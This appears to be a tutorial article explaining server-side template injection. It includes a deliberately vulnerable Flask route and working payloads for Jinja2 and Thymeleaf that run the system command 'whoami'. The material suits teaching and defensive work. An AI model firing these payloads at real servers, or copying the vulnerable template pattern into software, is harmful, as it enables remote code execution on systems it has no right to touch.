SSTI is a vulnerability that occurs when user input is unsafely embedded within a server-side template engine. This can lead to the execution of arbitrary code on the server, potentially compromising the application and its underlying system.

#### Why Does SSTI Occur?

Template engines are used to generate dynamic content in web applications. If user input is not properly validated or escaped before being processed by the template engine, an attacker may inject malicious payloads that get executed on the server.

#### Commonly Affected Template Engines

SSTI can affect various template engines across different programming languages, including:

- **Python** → Jinja2, Mako, Tornado
- **PHP** → Smarty, Twig
- **Java** → Freemarker, Velocity
- **Node.js** → Pug (formerly Jade), Handlebars
- **Ruby** → ERB

## Example of SSTI exploitation

**Vulnerable Code (Jinja2 - Python)**

```java
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/greet', methods=['GET'])
def greet():
    user_input = request.args.get('name', 'Guest')
    template = f"Hello {user_input}!"
    return render_template_string(template)
```

**Exploitation**
An attacker can send a payload like:
```bash
http://example.com/greet?name={{7*7}}
```

If vulnerable, the server will process the template and return:
```bash
Hello 49!
```

This confirms that the server is evaluating user input as code. An attacker could then escalate the attack to execute arbitrary code, such as:
```bash
http://example.com/greet?name={{config.__class__.__init__.__globals__['os'].system('whoami')}}
```

## SSTI in Java Template Engines (e.g., Thymeleaf with Spring Boot)

Java template engines like Thymeleaf allow expressions using Spring Expression Language (SpEL):

- Expressions look like: `*{...}` or `${...}`
- Improperly sanitized user input inside these expressions can allow attackers to:
    - Access Spring beans
    - Call arbitrary Java methods
    - Execute system commands via `Runtime.getRuntime().exec()`

**Example payload:**
```scss
*{T(java.lang.Runtime).getRuntime().exec('whoami')}
```